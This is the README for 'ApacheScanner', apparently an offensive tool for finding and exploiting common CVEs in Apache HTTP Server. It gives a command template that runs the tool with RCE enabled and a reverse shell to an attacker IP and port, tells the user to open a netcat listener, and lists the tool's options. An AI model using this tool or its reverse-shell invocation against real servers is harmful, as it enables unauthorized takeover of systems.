# ApacheScanner
Apache HTTP Server Scanner and takeover tool with all common CVE's of Apache HTTP Servers


run a netcat or whatever listener for the RCE 

To run this Script install the Required pip Modules and define your command by this: 

```python3 ApacheScanner.py -u http://serveriphere  --rce --cmd "your command here" --lhost <your attacker IP> --lport <Your listening port>``` 

```
Usage: ApacheScanner.py [options]

Apache HTTP Server scanning and overtaking tool written by Yqno.

Options:
  -h, --help            Show this help message and exit
  -u URL, --url URL     The target URL of your Apache HTTP Server (default is http://localhost:80)
  -t TIMEOUT, --timeout TIMEOUT
                        The timeout of the request in seconds (default is 25)
  -p PORT, --port PORT  The port number of your Apache HTTP Server (default port is 80)
  -c COMMAND, --command COMMAND
                        The command to be executed on your Apache HTTP Server (default is ls -l)
  --rce                 Enable remote code execution on your Scan (default is False)
  --cmd CMD             Command to run if RCE is enabled (default is whoami)
  --lhost LHOST         Attacker IP for reverse shell (required if --rce is enabled)
  --lport LPORT         Attacker listening port for reverse shell (required if --rce is enabled)
 ```  
